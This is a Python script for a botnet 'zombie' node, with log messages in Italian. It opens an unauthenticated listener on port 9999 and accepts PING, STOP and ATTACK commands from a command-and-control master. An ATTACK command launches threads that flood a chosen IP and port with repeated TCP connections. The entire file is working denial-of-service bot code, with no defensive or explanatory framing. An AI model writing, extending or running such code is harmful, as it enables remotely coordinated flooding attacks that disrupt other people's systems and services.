#!/usr/bin/env python3

import socket
import threading
import time
import sys
import signal


ZOMBIE_LISTEN_HOST = "0.0.0.0"
ZOMBIE_LISTEN_PORT = 9999

attack_threads = []
stop_attack_event = threading.Event()


def log(message):
    print(message, flush=True)


def tcp_flood_worker(target_ip, target_port, delay):
    while not stop_attack_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_ip, int(target_port)))
                s.sendall(b"ZOMBIE_TRAFFIC\n")
        except Exception:
            pass

        if delay > 0:
            time.sleep(delay)


def start_attack(target_ip, target_port, workers=5, delay=0.01):
    global attack_threads

    stop_attack()
    for thread in attack_threads:
        thread.join(timeout=0.2)

    attack_threads = []
    stop_attack_event.clear()

    for _ in range(workers):
        t = threading.Thread(
            target=tcp_flood_worker,
            args=(target_ip, target_port, delay),
            daemon=True
        )
        attack_threads.append(t)
        t.start()

    log(f"[Zombie] Attacco avviato verso {target_ip}:{target_port} con {workers} thread")


def stop_attack():
    stop_attack_event.set()
    log("[Zombie] Stop attacco richiesto")


def handle_command(command):
    parts = command.strip().split()

    if not parts:
        return "ERR comando vuoto\n"

    if parts[0].upper() == "PING":
        return "PONG\n"

    if parts[0].upper() == "STOP":
        stop_attack()
        return "OK stop\n"

    if parts[0].upper() == "ATTACK":
        if len(parts) < 3:
            return "ERR uso: ATTACK <target_ip> <target_port> [workers] [delay]\n"

        target_ip = parts[1]
        target_port = int(parts[2])
        workers = int(parts[3]) if len(parts) >= 4 else 5
        delay = float(parts[4]) if len(parts) >= 5 else 0.01

        start_attack(target_ip, target_port, workers, delay)
        return "OK attack started\n"

    return "ERR comando non riconosciuto\n"


def client_handler(conn, addr):
    try:
        data = conn.recv(1024)

        if not data:
            return

        command = data.decode(errors="ignore").strip()
        log(f"[Zombie] Comando ricevuto da {addr}: {command}")

        response = handle_command(command)
        conn.sendall(response.encode())

    except Exception as e:
        log(f"[Zombie] Errore gestione client {addr}: {e}")

    finally:
        try:
            conn.close()
        except Exception:
            pass


def run_server():
    log(f"[Zombie] Avvio listener su {ZOMBIE_LISTEN_HOST}:{ZOMBIE_LISTEN_PORT}")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((ZOMBIE_LISTEN_HOST, ZOMBIE_LISTEN_PORT))
        server_socket.listen(50)
    except Exception as e:
        log(f"[Zombie] ERRORE bind/listen porta {ZOMBIE_LISTEN_PORT}: {e}")
        sys.exit(1)

    log("[Zombie] Listener attivo. In attesa di comandi dal master C2...")

    while True:
        try:
            conn, addr = server_socket.accept()

            t = threading.Thread(
                target=client_handler,
                args=(conn, addr),
                daemon=True
            )
            t.start()

        except KeyboardInterrupt:
            log("[Zombie] Interruzione manuale")
            break

        except Exception as e:
            log(f"[Zombie] Errore accept: {e}")
            time.sleep(1)


def shutdown_handler(signum, frame):
    log("[Zombie] Arresto richiesto")
    stop_attack()
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGTERM, shutdown_handler)
    signal.signal(signal.SIGINT, shutdown_handler)

    run_server()
